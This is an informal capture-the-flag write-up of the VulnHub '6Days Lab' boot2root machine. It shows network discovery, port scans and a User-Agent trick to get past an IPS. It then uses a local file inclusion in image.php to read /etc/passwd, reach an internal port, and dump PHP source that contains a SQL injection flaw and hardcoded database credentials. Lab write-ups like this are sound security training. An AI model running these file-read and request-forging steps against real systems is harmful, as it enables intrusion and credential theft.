## 6Days Lab

### info

```
6Days Lab

Boot2root machine for educational purposes

Our first boot2root machine, execute /flag to complete the game.

Try your skills against an environment protected by IDS and sandboxes!

“Our product Rashomon IPS is so good, even we use it!” they claim.

Hope you enjoy.

v1.0 - 2016-07-12

v1.1 - 2016-07-25

https://www.vulnhub.com/entry/6days-lab-11,156/
```

### discovery

```bash
root@kali:~# netdiscover -r 192.168.93.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.93.1    00:50:56:c0:00:08      1      60  VMware, Inc.
 192.168.93.2    00:50:56:fe:26:a7      1      60  VMware, Inc.
 192.168.93.142  00:0c:29:47:f7:d7      1      60  VMware, Inc.
 192.168.93.254  00:50:56:e4:ef:80      1      60  VMware, Inc.
```

### port scan

```bash
root@kali:~# nmap -p- -sC -sV 192.168.93.142

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-07-25 17:39 BST
Nmap scan report for 192.168.93.142
Host is up (0.00035s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 62:ac:77:11:79:9a:21:64:c2:88:c0:87:7d:19:34:05 (DSA)
|   2048 cb:24:63:a9:7c:bc:7b:e9:a8:2a:d1:9f:4d:6a:a0:07 (RSA)
|_  256 13:e5:dd:7b:a5:f2:bf:41:71:dd:88:40:7f:5f:5d:7b (ECDSA)
80/tcp   open     http       Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Rashomon IPS - Main Page
8080/tcp filtered http-proxy
MAC Address: 00:0C:29:47:F7:D7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.60 seconds
```

### port 80

```bash
root@kali:~# curl 192.168.93.142
<html>
<head>
<title>Rashomon IPS - Main Page</title>
</head>
<body>
<h2>Rashomon Intrusion Prevention System</h2>
<h3>Become immune to every attack!</h3>
Today we're announcing our brand new product, Rashomon IPS! <br />
It's capable of blocking any <b>sophisticated cyber attack</b> which <u>can harm your precious customers.</u> (you don't want THAT to happen, do you?) <br />
<img src="http://192.168.93.142/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg" /> <br />
(This guy is coming after your website!) <br />
<br />
Don't waste your time and money by hiring <font color="#ff00cc">pentesters</font> and doing real security audits. <br />
This is the best way to secure your organization and you can completely rely on it, and only it! <br />
<br />
IT'S SO SECURE WE EVEN USE IT ON OUR WEBSITE. <br />
<br />
So be quick and get a <u>%15 discount</u> on our newest product using the promocode <b>NONEEDFORPENTEST</b>. (discount will be available until yesterday)<br />
<br />
<form name="promo" method="GET" action="checkpromo.php">
Apply your promo code here: <input type="text" name="promocode">
<input type="submit" value="Apply Promo">
</form>
</body>
</html>
```

i went to do a nikto scan and i found that the port was closed

```bash
root@kali:~# nmap 192.168.93.142

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-07-25 17:44 BST
Nmap scan report for 192.168.93.142
Host is up (0.00036s latency).
Not shown: 998 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
8080/tcp filtered http-proxy
MAC Address: 00:0C:29:47:F7:D7 (VMware)
```

this i'm guessing is the IPS

i was getting nowhere with port 8080, so in efforts i rebooted the vm

and port 80 is back

```bash
root@kali:~# nmap 192.168.93.142 -sV -sC

Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2016-07-25 17:58 BST
Nmap scan report for 192.168.93.142
Host is up (0.00036s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 62:ac:77:11:79:9a:21:64:c2:88:c0:87:7d:19:34:05 (DSA)
|   2048 cb:24:63:a9:7c:bc:7b:e9:a8:2a:d1:9f:4d:6a:a0:07 (RSA)
|_  256 13:e5:dd:7b:a5:f2:bf:41:71:dd:88:40:7f:5f:5d:7b (ECDSA)
80/tcp   open     http       Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Rashomon IPS - Main Page
8080/tcp filtered http-proxy
MAC Address: 00:0C:29:47:F7:D7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.92 seconds
```

very strange stuff going on here, i can't cURL the site with command `root@kali:~# curl http://192.168.39.142 -v` but i can with   
`root@kali:~# curl -X 'GET' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' 'http://192.168.93.142'`

There is a promocode called `NONEEDFORPENTEST` that is expired
```bash
root@kali:~# curl -X 'GET' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)''http://192.168.93.142/checkpromo.php?promocode=NONEEDFORPENTEST'
Code expired!
```

### LFI goodness

in trying to get a shell on the VM i noticed the following in the source code

```html
<img src="http://192.168.93.142/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg" /> <br />
```

redirecting that to `/etc/passwd` allows us to read local files

```bash
root@kali:~# curl "http://192.168.93.142/image.php?src=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:106::/var/run/dbus:/bin/false
whoopsie:x:104:107::/nonexistent:/bin/false
landscape:x:105:110::/var/lib/landscape:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
andrea:x:1001:1001::/home/andrea:/bin/andrea
```

i'm a donut, i wont be able to execute `/flag` but i was able to read **the binary**


the port 8080 showing up in nmap was really fustrating, but i think i've found it

```html
# curl http://192.168.93.142/image.php?src=http://127.0.0.1:8080
<html>
<head>
<title>Rashomon IPS - Main Page</title>
</head>
<body>
<h2>Rashomon Intrusion Prevention System</h2>
<h3>Become immune to every attack!</h3>
Today we're announcing our brand new product, Rashomon IPS! <br />
It's capable of blocking any <b>sophisticated cyber attack</b> which <u>can harm your precious customers.</u> (you don't want THAT to happen, do you?) <br />
<img src="http://192.168.93.142/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg" /> <br />
(This guy is coming after your website!) <br />
<br />
Don't waste your time and money by hiring <font color="#ff00cc">pentesters</font> and doing real security audits. <br />
This is the best way to secure your organization and you can completely rely on it, and only it! <br />
<br />
IT'S SO SECURE WE EVEN USE IT ON OUR WEBSITE. <br />
<br />
So be quick and get a <u>%15 discount</u> on our newest product using the promocode <b>NONEEDFORPENTEST</b>. (discount will be available until yesterday)<br />
<br />
<form name="promo" method="GET" action="checkpromo.php">
Apply your promo code here: <input type="text" name="promocode">
<input type="submit" value="Apply Promo">
</form>
</body>
</html>
```

```php
# curl http://192.168.93.142/image.php?src=checkpromo.php
<?php
include 'config.php';

$conn = mysql_connect($servername, $username, $password);

if (!$conn) {
       	die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT discount, status FROM promocodes WHERE promocode='".$_GET['promocode']."';";

mysql_select_db($dbname);
$result = mysql_query($sql, $conn);

if (!$result) {
       	echo "Promocode not valid!";
} else {
       	while($row = mysql_fetch_array($result, MYSQL_ASSOC))
       	{
       		if($row['status'] == 0)
       			echo "Code expired!";
       		else
       			echo "You have %".$row['discount']." discount!";
       	}
}

mysql_close($conn);
?>
```

```php
# curl http://192.168.93.142/image.php?src=config.php
<?php
$servername = "localhost";
$username = "sellingstuff";
$password = "n0_\$\$_n0_g41ns";
$dbname = "fancydb";
```
